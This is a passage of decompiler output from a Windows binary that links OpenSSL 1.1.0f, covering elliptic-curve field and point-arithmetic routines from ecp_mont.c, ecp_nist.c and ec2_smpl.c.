            *(_QWORD *)(a1 + 128) = v7;
            v15 = 0i64;
            v7 = 0i64;
            v8 = (unsigned int)sub_1400AF0F0(a1, (__int64)a2, a3, a4, v12);
            if ( !v8 )
            {
              sub_14003C3A0(*(_QWORD *)(a1 + 120));
              v17 = *(_DWORD **)(a1 + 128);
              *(_QWORD *)(a1 + 120) = 0i64;
              sub_140026FF0(v17);
              *(_QWORD *)(a1 + 128) = 0i64;
            }
          }
        }
      }
      else
      {
        sub_140024610(16, 189, 3, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecp_mont.c", 157);
      }
    }
    sub_140026FF0(v7);
    sub_140027BE0(v6);
    sub_14003C3A0(v15);
    return (int *)v8;
  }
  return result;
}

//----- (0000000140077BC0) ----------------------------------------------------
void __fastcall sub_140077BC0(__int64 a1)
{
  _DWORD *v2; // rcx

  sub_14003C3A0(*(_QWORD *)(a1 + 120));
  v2 = *(_DWORD **)(a1 + 128);
  *(_QWORD *)(a1 + 120) = 0i64;
  sub_140026FF0(v2);
  *(_QWORD *)(a1 + 128) = 0i64;
  sub_140078300((_DWORD **)a1);
}

//----- (0000000140077C10) ----------------------------------------------------
void __fastcall sub_140077C10(__int64 a1)
{
  __int64 *v2; // rcx

  sub_14003C3A0(*(_QWORD *)(a1 + 120));
  v2 = *(__int64 **)(a1 + 128);
  *(_QWORD *)(a1 + 120) = 0i64;
  sub_140026A10(v2);
  *(_QWORD *)(a1 + 128) = 0i64;
  sub_1400AF030((__int64 **)a1);
}

//----- (0000000140077C60) ----------------------------------------------------
__int64 __fastcall sub_140077C60(__int64 a1, __int64 a2)
{
  __int64 *v4; // rcx
  _DWORD *v5; // rax
  __int64 v6; // rcx
  _DWORD *v7; // rax

  sub_14003C3A0(*(_QWORD *)(a1 + 120));
  v4 = *(__int64 **)(a1 + 128);
  *(_QWORD *)(a1 + 120) = 0i64;
  sub_140026A10(v4);
  *(_QWORD *)(a1 + 128) = 0i64;
  if ( !(unsigned int)sub_1400AF070(a1, a2) )
    return 0i64;
  if ( *(_QWORD *)(a2 + 120) )
  {
    v5 = sub_14003C400();
    *(_QWORD *)(a1 + 120) = v5;
    if ( !v5 )
      return 0i64;
    if ( !sub_14003C310((__int64)v5, *(_QWORD *)(a2 + 120)) )
      goto LABEL_7;
  }
  v6 = *(_QWORD *)(a2 + 128);
  if ( v6 )
  {
    v7 = sub_140026F70(v6);
    *(_QWORD *)(a1 + 128) = v7;
    if ( !v7 )
    {
LABEL_7:
      sub_14003C3A0(*(_QWORD *)(a1 + 120));
      *(_QWORD *)(a1 + 120) = 0i64;
      return 0i64;
    }
  }
  return 1i64;
}

//----- (0000000140077D30) ----------------------------------------------------
__int64 __fastcall sub_140077D30(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int *a5)
{
  int v5; // eax
  __int64 v7; // r9

  v7 = *(_QWORD *)(a1 + 120);
  if ( v7 )
    return sub_14003CA60(a2, a3, a4, v7, a5);
  sub_140024610(v5 - 32, v5 + 83, v5 + 63, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecp_mont.c", 191);
  return 0i64;
}
// 140077D67: variable 'v5' is possibly undefined

//----- (0000000140077D90) ----------------------------------------------------
__int64 __fastcall sub_140077D90(__int64 a1, __int64 a2, __int64 a3, int *a4)
{
  int v4; // eax
  __int64 v6; // r9

  v6 = *(_QWORD *)(a1 + 120);
  if ( v6 )
    return sub_14003CA60(a2, a3, a3, v6, a4);
  sub_140024610(v4 - 40, v4 + 76, v4 + 55, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecp_mont.c", 202);
  return 0i64;
}
// 140077DBE: variable 'v4' is possibly undefined

//----- (0000000140077DF0) ----------------------------------------------------
__int64 __fastcall sub_140077DF0(__int64 a1, __int64 a2, __int64 a3, int *a4)
{
  __int64 v5; // r8

  v5 = *(_QWORD *)(a1 + 120);
  if ( v5 )
    return sub_1400275D0(a2, a3, v5, a4);
  sub_140024610(16, 134, 111, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecp_mont.c", 213);
  return 0i64;
}

//----- (0000000140077E50) ----------------------------------------------------
__int64 __fastcall sub_140077E50(__int64 a1, __int64 a2, __int64 a3, int *a4)
{
  __int64 v5; // r8

  v5 = *(_QWORD *)(a1 + 120);
  if ( v5 )
    return sub_14003C750(a2, a3, v5, a4);
  sub_140024610(16, 133, 111, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecp_mont.c", 224);
  return 0i64;
}

//----- (0000000140077EB0) ----------------------------------------------------
_BOOL8 __fastcall sub_140077EB0(__int64 a1, __int64 a2)
{
  __int64 v3; // rdx

  v3 = *(_QWORD *)(a1 + 128);
  if ( v3 )
    return sub_140026E90(a2, v3) != 0i64;
  sub_140024610(16, 209, 111, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecp_mont.c", 235);
  return 0i64;
}

//----- (0000000140077F10) ----------------------------------------------------
void *sub_140077F10()
{
  return &unk_14010ED90;
}

//----- (0000000140077F20) ----------------------------------------------------
__int64 __fastcall sub_140077F20(__int64 a1, __int64 a2)
{
  *(_QWORD *)(a1 + 136) = *(_QWORD *)(a2 + 136);
  return sub_1400AF070(a1, a2);
}

//----- (0000000140077F50) ----------------------------------------------------
int *__fastcall sub_140077F50(__int64 a1, __int64 *a2, __int64 a3, __int64 a4, int *a5)
{
  int *v5; // rsi
  unsigned int v6; // r14d
  __int64 v11; // rdi
  int *result; // rax
  __int64 *v13; // rax
  __int64 (__fastcall *v14)(__int64, __int64, __int64, int *); // rax
  __int64 *v15; // rax
  __int64 *v16; // rax
  __int64 *v17; // rax
  __int64 *v18; // rax

  v5 = a5;
  v6 = 0;
  v11 = 0i64;
  if ( a5 || (result = (int *)sub_140027CD0(), v11 = (__int64)result, (v5 = result) != 0i64) )
  {
    sub_140027D40(v5);
    v13 = (__int64 *)sub_1400767D0();
    if ( (unsigned int)sub_140027600(v13, a2) )
    {
      v15 = (__int64 *)sub_1400767E0();
      if ( (unsigned int)sub_140027600(v15, a2) )
      {
        v16 = (__int64 *)sub_1400767F0();
        if ( (unsigned int)sub_140027600(v16, a2) )
        {
          v17 = (__int64 *)sub_140076800();
          if ( (unsigned int)sub_140027600(v17, a2) )
          {
            v18 = (__int64 *)sub_140076810();
            if ( (unsigned int)sub_140027600(v18, a2) )
            {
              sub_140024610(16, 202, 135, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecp_nist.c", 107);
              goto LABEL_15;
            }
            v14 = sub_140077620;
          }
          else
          {
            v14 = sub_1400771D0;
          }
        }
        else
        {
          v14 = sub_140076E50;
        }
      }
      else
      {
        v14 = sub_140076AA0;
      }
    }
    else
    {
      v14 = sub_140076820;
    }
    *(_QWORD *)(a1 + 136) = v14;
    v6 = (unsigned int)sub_1400AF0F0(a1, (__int64)a2, a3, a4, v5);
LABEL_15:
    sub_140027B60((__int64)v5);
    sub_140027BE0(v11);
    return (int *)v6;
  }
  return result;
}

//----- (00000001400780C0) ----------------------------------------------------
__int64 __fastcall sub_1400780C0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int *a5)
{
  unsigned int v5; // edi
  __int64 v10; // rbp
  int *v11; // rbx

  v5 = 0;
  v10 = 0i64;
  if ( a1 && a2 && a3 && a4 )
  {
    v11 = a5;
    if ( a5 || (v11 = (int *)sub_140027CD0(), (v10 = (__int64)v11) != 0) )
    {
      if ( (unsigned int)sub_14006E5B0(a2, a3, a4, v11)
        && (*(unsigned int (__fastcall **)(__int64, __int64, _QWORD, int *))(a1 + 136))(
             a2,
             a2,
             *(_QWORD *)(a1 + 64),
             v11) )
      {
        v5 = 1;
      }
    }
  }
  else
  {
    sub_140024610(16, 200, 67, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecp_nist.c", 126);
  }
  sub_140027BE0(v10);
  return v5;
}

//----- (00000001400781B0) ----------------------------------------------------
__int64 __fastcall sub_1400781B0(__int64 a1, __int64 a2, __int64 a3, int *a4)
{
  unsigned int v4; // edi
  int *v5; // rbx
  __int64 v9; // rbp

  v4 = 0;
  v5 = a4;
  v9 = 0i64;
  if ( a1 && a2 && a3 )
  {
    if ( a4 || (v5 = (int *)sub_140027CD0(), (v9 = (__int64)v5) != 0) )
    {
      if ( (unsigned int)sub_14006F810(a2, a3, v5)
        && (*(unsigned int (__fastcall **)(__int64, __int64, _QWORD, int *))(a1 + 136))(
             a2,
             a2,
             *(_QWORD *)(a1 + 64),
             v5) )
      {
        v4 = 1;
      }
    }
  }
  else
  {
    sub_140024610(16, 201, 134, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ecp_nist.c", 151);
  }
  sub_140027BE0(v9);
  return v4;
}

//----- (0000000140078280) ----------------------------------------------------
void *sub_140078280()
{
  return &unk_14010EF40;
}

//----- (0000000140078290) ----------------------------------------------------
__int64 __fastcall sub_140078290(_QWORD *a1)
{
  _DWORD *v2; // rax
  _DWORD *v3; // rcx

  a1[8] = sub_140027200();
  a1[12] = sub_140027200();
  v2 = sub_140027200();
  v3 = (_DWORD *)a1[8];
  a1[13] = v2;
  if ( v3 && a1[12] && v2 )
    return 1i64;
  sub_140026FF0(v3);
  sub_140026FF0((_DWORD *)a1[12]);
  sub_140026FF0((_DWORD *)a1[13]);
  return 0i64;
}

//----- (0000000140078300) ----------------------------------------------------
void __fastcall sub_140078300(_DWORD **a1)
{
  sub_140026FF0(a1[8]);
  sub_140026FF0(a1[12]);
  sub_140026FF0(a1[13]);
}

//----- (0000000140078340) ----------------------------------------------------
__int64 __fastcall sub_140078340(__int64 a1)
{
  __int64 result; // rax

  sub_140026A10(*(__int64 **)(a1 + 64));
  sub_140026A10(*(__int64 **)(a1 + 96));
  sub_140026A10(*(__int64 **)(a1 + 104));
  result = 0i64;
  *(_DWORD *)(a1 + 92) = -1;
  *(_QWORD *)(a1 + 72) = 0i64;
  *(_QWORD *)(a1 + 80) = 0i64;
  *(_DWORD *)(a1 + 88) = 0;
  return result;
}

//----- (0000000140078390) ----------------------------------------------------
__int64 __fastcall sub_140078390(__int64 a1, __int64 a2)
{
  int v5; // eax

  if ( !sub_140026E90(*(_QWORD *)(a1 + 64), *(_QWORD *)(a2 + 64)) )
    return 0i64;
  if ( !sub_140026E90(*(_QWORD *)(a1 + 96), *(_QWORD *)(a2 + 96)) )
    return 0i64;
  if ( !sub_140026E90(*(_QWORD *)(a1 + 104), *(_QWORD *)(a2 + 104)) )
    return 0i64;
  v5 = *(_DWORD *)(a2 + 72);
  *(_DWORD *)(a1 + 72) = v5;
  *(_DWORD *)(a1 + 76) = *(_DWORD *)(a2 + 76);
  *(_DWORD *)(a1 + 80) = *(_DWORD *)(a2 + 80);
  *(_DWORD *)(a1 + 84) = *(_DWORD *)(a2 + 84);
  *(_DWORD *)(a1 + 88) = *(_DWORD *)(a2 + 88);
  *(_DWORD *)(a1 + 92) = *(_DWORD *)(a2 + 92);
  if ( !sub_140027B30(*(_QWORD *)(a1 + 96), (v5 + 63) / 64)
    || !sub_140027B30(*(_QWORD *)(a1 + 104), (*(_DWORD *)(a1 + 72) + 63) / 64) )
  {
    return 0i64;
  }
  sub_1400753D0(*(_QWORD *)(a1 + 96));
  sub_1400753D0(*(_QWORD *)(a1 + 104));
  return 1i64;
}

//----- (0000000140078470) ----------------------------------------------------
__int64 __fastcall sub_140078470(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 result; // rax

  result = (__int64)sub_140026E90(*(_QWORD *)(a1 + 64), a2);
  if ( result )
  {
    if ( (((unsigned int)sub_14007B900(*(_QWORD *)(a1 + 64), a1 + 72, 6) - 4) & 0xFFFFFFFD) != 0 )
    {
      sub_140024610(16, 195, 131, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec2_smpl.c", 180);
      return 0i64;
    }
    if ( !(unsigned int)sub_14007A500(*(_QWORD *)(a1 + 96), a3, (_DWORD *)(a1 + 72)) )
      return 0i64;
    if ( !sub_140027B30(*(_QWORD *)(a1 + 96), (*(_DWORD *)(a1 + 72) + 63) / 64) )
      return 0i64;
    sub_1400753D0(*(_QWORD *)(a1 + 96));
    if ( !(unsigned int)sub_14007A500(*(_QWORD *)(a1 + 104), a4, (_DWORD *)(a1 + 72))
      || !sub_140027B30(*(_QWORD *)(a1 + 104), (*(_DWORD *)(a1 + 72) + 63) / 64) )
    {
      return 0i64;
    }
    sub_1400753D0(*(_QWORD *)(a1 + 104));
    return 1i64;
  }
  return result;
}

//----- (00000001400785A0) ----------------------------------------------------
_QWORD *__fastcall sub_1400785A0(__int64 *a1, __int64 a2, __int64 a3, __int64 a4)
{
  unsigned int v4; // ebx
  _QWORD *result; // rax

  v4 = 0;
  if ( !a2 || (result = sub_140026E90(a2, a1[8])) != 0i64 )
  {
    if ( (!a3 || sub_140026E90(a3, a1[12])) && (!a4 || sub_140026E90(a4, a1[13])) )
      return (_QWORD *)1;
    return (_QWORD *)v4;
  }
  return result;
}

//----- (0000000140078630) ----------------------------------------------------
__int64 __fastcall sub_140078630(__int64 a1)
{
  return (unsigned int)sub_140027260(*(_QWORD *)(a1 + 64)) - 1;
}

//----- (0000000140078650) ----------------------------------------------------
__int64 __fastcall sub_140078650(__int64 a1, int *a2)
{
  unsigned int v2; // esi
  int *v3; // rbx
  int *v5; // rdi
  _QWORD *v6; // rax
  __int64 v7; // rbp

  v2 = 0;
  v3 = a2;
  v5 = 0i64;
  if ( a2 || (v5 = (int *)sub_140027CD0(), (v3 = v5) != 0i64) )
  {
    sub_140027D40(v3);
    v6 = sub_140027C40(v3);
    v7 = (__int64)v6;
    if ( v6
      && (unsigned int)sub_14007A500((__int64)v6, *(_QWORD *)(a1 + 104), (_DWORD *)(a1 + 72))
      && !sub_140027160(v7) )
    {
      v2 = 1;
    }
    if ( v3 )
      sub_140027B60((__int64)v3);
  }
  else
  {
    sub_140024610(16, 159, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec2_smpl.c", 259);
  }
  sub_140027BE0((__int64)v5);
  return v2;
}

//----- (0000000140078730) ----------------------------------------------------
__int64 __fastcall sub_140078730(_QWORD *a1)
{
  _DWORD *v2; // rax
  _DWORD *v3; // rcx

  a1[1] = sub_140027200();
  a1[2] = sub_140027200();
  v2 = sub_140027200();
  v3 = (_DWORD *)a1[1];
  a1[3] = v2;
  if ( v3 && a1[2] && v2 )
    return 1i64;
  sub_140026FF0(v3);
  sub_140026FF0((_DWORD *)a1[2]);
  sub_140026FF0((_DWORD *)a1[3]);
  return 0i64;
}

//----- (00000001400787A0) ----------------------------------------------------
void __fastcall sub_1400787A0(_DWORD **a1)
{
  sub_140026FF0(a1[1]);
  sub_140026FF0(a1[2]);
  sub_140026FF0(a1[3]);
}

//----- (00000001400787E0) ----------------------------------------------------
void __fastcall sub_1400787E0(__int64 a1)
{
  sub_140026A10(*(__int64 **)(a1 + 8));
  sub_140026A10(*(__int64 **)(a1 + 16));
  sub_140026A10(*(__int64 **)(a1 + 24));
  *(_DWORD *)(a1 + 32) = 0;
}

//----- (0000000140078820) ----------------------------------------------------
__int64 __fastcall sub_140078820(__int64 a1, __int64 a2)
{
  if ( !sub_140026E90(*(_QWORD *)(a1 + 8), *(_QWORD *)(a2 + 8))
    || !sub_140026E90(*(_QWORD *)(a1 + 16), *(_QWORD *)(a2 + 16))
    || !sub_140026E90(*(_QWORD *)(a1 + 24), *(_QWORD *)(a2 + 24)) )
  {
    return 0i64;
  }
  *(_DWORD *)(a1 + 32) = *(_DWORD *)(a2 + 32);
  return 1i64;
}

//----- (00000001400788A0) ----------------------------------------------------
__int64 __fastcall sub_1400788A0(__int64 a1, __int64 a2)
{
  __int64 v2; // rcx

  v2 = *(_QWORD *)(a2 + 24);
  *(_DWORD *)(a2 + 32) = 0;
  sub_140027560(v2, 0i64);
  return 1i64;
}

//----- (00000001400788D0) ----------------------------------------------------
__int64 __fastcall sub_1400788D0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  unsigned int v4; // edi
  void **v7; // rax

  v4 = 0;
  if ( a3 && a4 )
  {
    if ( sub_140026E90(*(_QWORD *)(a2 + 8), a3) )
    {
      sub_140027540(*(_QWORD *)(a2 + 8), 0);
      if ( sub_140026E90(*(_QWORD *)(a2 + 16), a4) )
      {
        sub_140027540(*(_QWORD *)(a2 + 16), 0);
        v7 = sub_140027650();
        if ( sub_140026E90(*(_QWORD *)(a2 + 24), (__int64)v7) )
        {
          sub_140027540(*(_QWORD *)(a2 + 24), 0);
          v4 = 1;
          *(_DWORD *)(a2 + 32) = 1;
        }
      }
    }
    return v4;
  }
  else
  {
    sub_140024610(16, 163, 67, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec2_smpl.c", 361);
    return 0i64;
  }
}

//----- (00000001400789A0) ----------------------------------------------------
__int64 __fastcall sub_1400789A0(__int64 a1, _QWORD *a2, __int64 a3, __int64 a4)
{
  unsigned int v7; // ebp
  __int64 *v9; // rax

  v7 = 0;
  if ( (unsigned int)sub_140022480(a1, a2) )
  {
    sub_140024610(16, 162, 106, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec2_smpl.c", 394);
    return 0i64;
  }
  v9 = (__int64 *)sub_140027650();
  if ( (unsigned int)sub_140026AB0(a2[3], v9) )
  {
    sub_140024610(16, 162, 66, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec2_smpl.c", 400);
    return 0i64;
  }
  if ( a3 )
  {
    if ( !sub_140026E90(a3, a2[1]) )
      return v7;
    sub_140027540(a3, 0);
  }
  if ( !a4 )
    return 1;
  if ( sub_140026E90(a4, a2[2]) )
  {
    sub_140027540(a4, 0);
    return 1;
  }
  return v7;
}

//----- (0000000140078A90) ----------------------------------------------------
int *__fastcall sub_140078A90(__int64 *a1, _QWORD *a2, __int64 a3, __int64 a4, int *a5)
{
  __int64 v6; // rbp
  int v10; // eax
  _QWORD *v11; // rdx
  int *result; // rax
  int *v13; // rsi
  _QWORD *v14; // rdi
  _QWORD *v15; // r12
  _QWORD *v16; // r14
  bool v17; // zf
  __int64 v18; // rdx
  __int64 *v19; // r13
  __int64 v20; // r8
  BOOL v21; // [rsp+30h] [rbp-58h]
  __int64 *v22; // [rsp+38h] [rbp-50h]
  __int64 *v23; // [rsp+40h] [rbp-48h]
  __int64 *v24; // [rsp+48h] [rbp-40h]
  _QWORD *v25; // [rsp+50h] [rbp-38h]
  __int64 *v26; // [rsp+58h] [rbp-30h]

  v6 = 0i64;
  v21 = 0;
  v10 = sub_140022480((__int64)a1, (_QWORD *)a3);
  v11 = (_QWORD *)a4;
  if ( v10 )
    goto LABEL_4;
  if ( (unsigned int)sub_140022480((__int64)a1, (_QWORD *)a4) )
  {
    v11 = (_QWORD *)a3;
LABEL_4:
    LOBYTE(v6) = (unsigned int)sub_140022150(a2, v11) != 0;
    return (int *)(unsigned int)v6;
  }
  v13 = a5;
  if ( a5 || (result = (int *)sub_140027CD0(), v6 = (__int64)result, (v13 = result) != 0i64) )
  {
    sub_140027D40(v13);
    v22 = sub_140027C40(v13);
    v23 = sub_140027C40(v13);
    v26 = sub_140027C40(v13);
    v24 = sub_140027C40(v13);
    v14 = sub_140027C40(v13);
    v15 = sub_140027C40(v13);
    v16 = sub_140027C40(v13);
    v25 = sub_140027C40(v13);
    if ( v25 )
    {
      if ( *(_DWORD *)(a3 + 32) )
      {
        if ( !sub_140026E90((__int64)v22, *(_QWORD *)(a3 + 8)) )
          goto LABEL_42;
        v17 = sub_140026E90((__int64)v23, *(_QWORD *)(a3 + 16)) == 0i64;
      }
      else
      {
        v17 = (unsigned int)sub_140022300((__int64)a1, (_QWORD *)a3) == 0;
      }
      if ( !v17 )
      {
        if ( *(_DWORD *)(a4 + 32) )
        {
          if ( !sub_140026E90((__int64)v26, *(_QWORD *)(a4 + 8)) )
            goto LABEL_42;
          v18 = *(_QWORD *)(a4 + 16);
          v19 = v24;
          if ( !sub_140026E90((__int64)v24, v18) )
            goto LABEL_42;
        }
        else
        {
          if ( !(unsigned int)sub_140022300((__int64)a1, (_QWORD *)a4) )
            goto LABEL_42;
          v19 = v24;
        }
        if ( (unsigned int)sub_140027600(v22, v26) )
        {
          if ( (unsigned int)sub_14007A380((__int64)v25, (__int64)v22, (__int64)v26)
            && (unsigned int)sub_14007A380((__int64)v16, (__int64)v23, (__int64)v19)
            && (*(unsigned int (__fastcall **)(__int64 *, _QWORD *, _QWORD *, _QWORD *, int *))(*a1 + 280))(
                 a1,
                 v16,
                 v16,
                 v25,
                 v13)
            && (*(unsigned int (__fastcall **)(__int64 *, _QWORD *, _QWORD *, int *))(*a1 + 272))(a1, v14, v16, v13)
            && (unsigned int)sub_14007A380((__int64)v14, (__int64)v14, a1[12])
            && (unsigned int)sub_14007A380((__int64)v14, (__int64)v14, (__int64)v16) )
          {
            v20 = (__int64)v25;
LABEL_34:
            if ( (unsigned int)sub_14007A380((__int64)v14, (__int64)v14, v20)
              && (unsigned int)sub_14007A380((__int64)v15, (__int64)v26, (__int64)v14)
              && (*(unsigned int (__fastcall **)(__int64 *, _QWORD *, _QWORD *, _QWORD *, int *))(*a1 + 264))(
                   a1,
                   v15,
                   v15,
                   v16,
                   v13)
              && (unsigned int)sub_14007A380((__int64)v15, (__int64)v15, (__int64)v14)
              && (unsigned int)sub_14007A380((__int64)v15, (__int64)v15, (__int64)v19) )
            {
              if ( (unsigned int)sub_1400227F0((__int64)a1, a2) )
                v21 = 1;
            }
          }
        }
        else if ( (unsigned int)sub_140027600(v23, v19) || sub_140027160((__int64)v26) )
        {
          v21 = sub_1400229F0((__int64)a1, a2) != 0;
        }
        else if ( (*(unsigned int (__fastcall **)(__int64 *, _QWORD *, __int64 *, __int64 *, int *))(*a1 + 280))(
                    a1,
                    v16,
                    v19,
                    v26,
                    v13)
               && (unsigned int)sub_14007A380((__int64)v16, (__int64)v16, (__int64)v26)
               && (*(unsigned int (__fastcall **)(__int64 *, _QWORD *, _QWORD *, int *))(*a1 + 272))(a1, v14, v16, v13)
               && (unsigned int)sub_14007A380((__int64)v14, (__int64)v14, (__int64)v16) )
        {
          v20 = a1[12];
          goto LABEL_34;
        }
      }
    }
LABEL_42:
    sub_140027B60((__int64)v13);
    sub_140027BE0(v6);
    return (int *)v21;
  }
  return result;
}

//----- (0000000140078EA0) ----------------------------------------------------
int *__fastcall sub_140078EA0(__int64 *a1, _QWORD *a2, __int64 a3, int *a4)
{
  return sub_140078A90(a1, a2, a3, a3, a4);
}

//----- (0000000140078EC0) ----------------------------------------------------
__int64 __fastcall sub_140078EC0(__int64 a1, _QWORD *a2)
{
  __int64 result; // rax

  if ( (unsigned int)sub_140022480(a1, a2) || sub_140027160(a2[2]) )
    return 1i64;
  result = sub_140022580(a1, a2);
  if ( (_DWORD)result )
    return sub_14007A380(a2[2], a2[1], a2[2]);
  return result;
}

//----- (0000000140078F50) ----------------------------------------------------
_BOOL8 __fastcall sub_140078F50(__int64 a1, __int64 a2)
{
  return sub_140027160(*(_QWORD *)(a2 + 24));
}

//----- (0000000140078F70) ----------------------------------------------------
__int64 __fastcall sub_140078F70(__int64 *a1, __int64 a2, int *a3)
{
  unsigned int v6; // esi
  int *v7; // r15
  unsigned int (__fastcall *v9)(__int64 *, __int64, __int64, _QWORD, int *); // r13
  _QWORD *v10; // r12
  _QWORD *v11; // rax
  __int64 v12; // rbx
  unsigned int (__fastcall *v13)(__int64 *, _QWORD *, _QWORD, int *); // [rsp+78h] [rbp+20h]

  v6 = -1;
  v7 = 0i64;
  if ( (unsigned int)sub_140022480((__int64)a1, (_QWORD *)a2) )
    return 1i64;
  v9 = *(unsigned int (__fastcall **)(__int64 *, __int64, __int64, _QWORD, int *))(*a1 + 264);
  v13 = *(unsigned int (__fastcall **)(__int64 *, _QWORD *, _QWORD, int *))(*a1 + 272);
  if ( *(_DWORD *)(a2 + 32) )
  {
    if ( a3 || (v7 = (int *)sub_140027CD0(), (a3 = v7) != 0i64) )
    {
      sub_140027D40(a3);
      v10 = sub_140027C40(a3);
      v11 = sub_140027C40(a3);
      v12 = (__int64)v11;
      if ( v11
        && (unsigned int)sub_14007A380((__int64)v11, *(_QWORD *)(a2 + 8), a1[12])
        && v9(a1, v12, v12, *(_QWORD *)(a2 + 8), a3)
        && (unsigned int)sub_14007A380(v12, v12, *(_QWORD *)(a2 + 16))
        && v9(a1, v12, v12, *(_QWORD *)(a2 + 8), a3)
        && (unsigned int)sub_14007A380(v12, v12, a1[13])
        && v13(a1, v10, *(_QWORD *)(a2 + 16), a3)
        && (unsigned int)sub_14007A380(v12, v12, (__int64)v10) )
      {
        v6 = sub_140027160(v12);
      }
      if ( a3 )
        sub_140027B60((__int64)a3);
      sub_140027BE0((__int64)v7);
    }
  }
  return v6;
}

//----- (00000001400790F0) ----------------------------------------------------
__int64 __fastcall sub_1400790F0(__int64 a1, __int64 a2, __int64 a3, int *a4)
{
  unsigned int v4; // esi
  int *v6; // r15
  unsigned int v10; // ebx
  __int64 *v12; // r13
  _QWORD *v13; // [rsp+30h] [rbp-48h]
  _QWORD *v14; // [rsp+38h] [rbp-40h]
  __int64 *v15; // [rsp+40h] [rbp-38h]

  v4 = 0;
  v6 = 0i64;
  v10 = -1;
  if ( (unsigned int)sub_140022480(a1, (_QWORD *)a2) )
  {
    LOBYTE(v4) = (unsigned int)sub_140022480(a1, (_QWORD *)a3) == 0;
    return v4;
  }
  else if ( (unsigned int)sub_140022480(a1, (_QWORD *)a3) )
  {
    return 1i64;
  }
  else if ( *(_DWORD *)(a2 + 32) && *(_DWORD *)(a3 + 32) )
  {
    if ( (unsigned int)sub_140026AB0(*(_QWORD *)(a2 + 8), *(__int64 **)(a3 + 8))
      || (unsigned int)sub_140026AB0(*(_QWORD *)(a2 + 16), *(__int64 **)(a3 + 16)) )
    {
      return 1;
    }
    return v4;
  }
  else
  {
    if ( a4 || (v6 = (int *)sub_140027CD0(), (a4 = v6) != 0i64) )
    {
      sub_140027D40(a4);
      v13 = sub_140027C40(a4);
      v14 = sub_140027C40(a4);
      v15 = sub_140027C40(a4);
      v12 = sub_140027C40(a4);
      if ( v12 )
      {
        if ( (unsigned int)sub_140022300(a1, (_QWORD *)a2) )
        {
          if ( (unsigned int)sub_140022300(a1, (_QWORD *)a3) )
          {
            if ( (unsigned int)sub_140026AB0((__int64)v13, v15)
              || (v10 = 0, (unsigned int)sub_140026AB0((__int64)v14, v12)) )
            {
              v10 = 1;
            }
          }
        }
      }
      if ( a4 )
        sub_140027B60((__int64)a4);
      sub_140027BE0((__int64)v6);
    }
    return v10;
  }
}

//----- (0000000140079290) ----------------------------------------------------
__int64 __fastcall sub_140079290(__int64 a1, __int64 a2, int *a3)
{
  __int64 v3; // rsi
  unsigned int v7; // ebp
  __int64 result; // rax
  _QWORD *v9; // r12
  _QWORD *v10; // r14

  v3 = 0i64;
  v7 = 0;
  if ( *(_DWORD *)(a2 + 32) || (unsigned int)sub_140022480(a1, (_QWORD *)a2) )
    return 1i64;
  if ( a3 || (result = (__int64)sub_140027CD0(), v3 = result, (a3 = (int *)result) != 0i64) )
  {
    sub_140027D40(a3);
    v9 = sub_140027C40(a3);
    v10 = sub_140027C40(a3);
    if ( v10
      && (unsigned int)sub_140022300(a1, (_QWORD *)a2)
      && sub_140026E90(*(_QWORD *)(a2 + 8), (__int64)v9)
      && sub_140026E90(*(_QWORD *)(a2 + 16), (__int64)v10)
      && (unsigned int)sub_140027560(*(_QWORD *)(a2 + 24), 1i64) )
    {
      *(_DWORD *)(a2 + 32) = 1;
      v7 = 1;
    }
    if ( a3 )
      sub_140027B60((__int64)a3);
    sub_140027BE0(v3);
    return v7;
  }
  return result;
}

//----- (00000001400793B0) ----------------------------------------------------
__int64 __fastcall sub_1400793B0(__int64 a1, unsigned __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rbx

  v4 = 0i64;
  if ( !a2 )
    return 1i64;
  while ( (*(unsigned int (__fastcall **)(__int64, _QWORD, __int64))(*(_QWORD *)a1 + 224i64))(
            a1,
            *(_QWORD *)(a3 + 8 * v4),
            a4) )
  {
    if ( ++v4 >= a2 )
      return 1i64;
  }
  return 0i64;
}

//----- (0000000140079440) ----------------------------------------------------
__int64 __fastcall sub_140079440(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int *a5)
{
  return sub_14007AF90(a2, a3, a4, (_DWORD *)(a1 + 72), a5);
}

//----- (0000000140079470) ----------------------------------------------------
__int64 __fastcall sub_140079470(__int64 a1, __int64 a2, __int64 a3, int *a4)
{
  return sub_14007B640(a2, a3, (_DWORD *)(a1 + 72), a4);
}

//----- (00000001400794A0) ----------------------------------------------------
_BOOL8 __fastcall sub_1400794A0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int *a5)
{
  return sub_14007A790(a2, a3, a4, *(_QWORD *)(a1 + 64), a5);
}

//----- (00000001400794D0) ----------------------------------------------------
void *sub_1400794D0()
{
  return &unk_14010F0F0;
}

//----- (00000001400794E0) ----------------------------------------------------
__int64 __fastcall sub_1400794E0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int *a5)
{
  __int64 result; // rax

  result = sub_140041A10(a1, a2, a3);
  if ( (_DWORD)result )
    return sub_1400798F0(a1, a1, a4, a5);
  return result;
}

//----- (0000000140079530) ----------------------------------------------------
__int64 __fastcall sub_140079530(__int64 *a1, __int64 a2, __int64 a3, __int64 *a4)
{
  __int64 result; // rax

  result = sub_140041BA0((__int64)a1, a2, a3);
  if ( (_DWORD)result )
  {
    if ( (int)sub_140027600(a1, a4) < 0 )
      return 1i64;
    else
      return sub_140041C70((__int64)a1, (__int64)a1, (__int64)a4);
  }
  return result;
}

